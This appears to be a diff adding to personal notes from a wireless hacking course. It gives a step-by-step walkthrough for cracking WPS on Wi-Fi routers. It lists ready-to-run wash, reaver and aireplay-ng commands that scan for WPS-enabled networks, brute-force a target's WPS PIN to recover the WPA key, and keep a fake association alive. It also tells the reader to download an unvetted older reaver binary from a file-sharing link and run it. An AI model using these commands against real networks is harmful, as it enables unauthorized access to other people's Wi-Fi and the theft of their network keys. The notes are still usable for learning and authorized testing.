@@ -256,4 +256,22 @@ enabled and try it.
 
 Exploiting the WPS ->
 - enable the monitor mode on the wireless adapter
-- wash // this will show all the networks which have WPS enabled
+cmd -> wash --interface wlan0 // this will show all the networks which have WPS enabled,
+  - Vendors - it will also list the vendors of the hardwares
+  - LCK - tell us whether WPS is locked or not, bcz sometimes WPS locks after no. of failed attempts, hence if it says 'No' then we
+          can go ahead and try to guess the pin
+  - WPS - it tells the version of WPS
+  - dBm - tells the signal strength
+  - Ch - Channel
+  
+cmds down below terminal 2 should fire just after the terminal 1 
+cmd in terminal 1 -> reaver --bssid target_network_bssid --channel channel_no --interface wlan0 -vvv --no-associate
+// this will use bruteforce to get the right pin, -vvv tells more details if things go wrong
+// if u r getting a bug which means u need to use the older version, download from here -> https://files.fm/f/eqrts3rc
+//    then -> chmod +x reaver // to change the permissions of file
+//    cmd -> ./reaver
+//then ->./reaver --bssid target_network_bssid --channel channel_no --interface wlan0 -vvv --no-associate // run from the directory
+// after the execution is done at it's end u will find 'WPS Pin' which will show the o/p pin in the 'WPA PSK' u will get the WPA key
+// which u can use to connect to network
+cmd in terminal 2 -> aireplay-ng --fakeauth 30 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0 
+// here we r mentioning 30 so that we can associate with the target network every 30 seconds
